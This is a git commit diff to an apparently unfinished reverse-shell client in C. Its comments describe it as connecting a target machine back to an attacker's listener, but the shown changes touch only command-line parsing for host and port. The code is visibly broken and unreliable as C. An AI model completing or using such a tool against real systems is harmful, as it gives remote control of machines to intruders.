8d6728b9e48b23d1a7d75c47d6a88463d94056e5
nashiaholloway <nashiaholloway1@gmail.com>
2020-02-11 22:13:08 -0500

    need to work out errors

--- reverse_tcp.c
+++ reverse_tcp.c
@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include <argp.h> // option switches
+#include <stdlib.h>
 #include <getopt.h> // parse command line args
 
 // CLIENT to connect to attacker's listening "SERVER"
@@ -8,39 +8,38 @@
     "usage:\n"                                                                                              \
     "  reverse_tcp [options]\n"                                                                             \
     "options:\n"                                                                                            \
-    "  -lhost              The host you want your target machine to connect to \n"                          \
+    "  -s                  The host you want your target machine to connect to \n"                          \
     "  -p                  The port you want your target machine to connect to (Default: 4444)\n"           \
     "  -h                  Show this help message\n"
 
 /* STRUCT FOR OPTIONS ==================================================== */
 // https://stackoverflow.com/questions/9642732/parsing-command-line-arguments-in-c
-static struct switches options[] {
-    {"LHOST", required_argument, NULL, 'lhost'},
-    {"LPORT", required_argument, NULL, 'lport'},
+static struct switches options[] = {
+    {"LHOST", required_argument, NULL, 's'},
+    {"LPORT", required_argument, NULL, 'p'},
     {"help", no_argument, NULL, 'h'},
     {NULL, 0, NULL, 0}};
-}
 
 /* MAIN ================================================================== */
 int main(int argc, char **argv) {
 
     int opt = 0;
-    unsigned short port = 4444;
+    unsigned short lport = 4444;
 
     // parse and set command line arguments
     // https://www.geeksforgeeks.org/getopt-function-in-c-to-parse-command-line-arguments/
-    while ((opt = getopt_long(argc, argv, "lhost:lport:hx", options, NULL)) != -1) {
+    while ((opt = getopt_long(argc, argv, "s:p:hx", options, NULL)) != -1) {
         switch (opt) {
-            case: 'lhost': //server
+            case 'lhost': //server
                 lhost = optarg;
                 break;
-            case: 'lport': //port
+            case 'lport': //port
                 lport = atoi(optarg);
                 break;
             default: //show usage if error
                 fprintf(stderr, "%s", USAGE);
                 exit(1);
-            case: 'h' //help
+            case 'h': //help
                 fprintf(stderr, "%s", USAGE);
                 exit(0);
                 break;
@@ -52,7 +51,7 @@ int main(int argc, char **argv) {
         exit(1);
     }
 
-    if ((port < 1025) || (port > 65535))
+    if ((lport < 1025) || (lport > 65535))
     {
         fprintf(stderr, "%s @ %d: invalid port number (%d)\n", __FILE__, __LINE__, portno);
         exit(1);
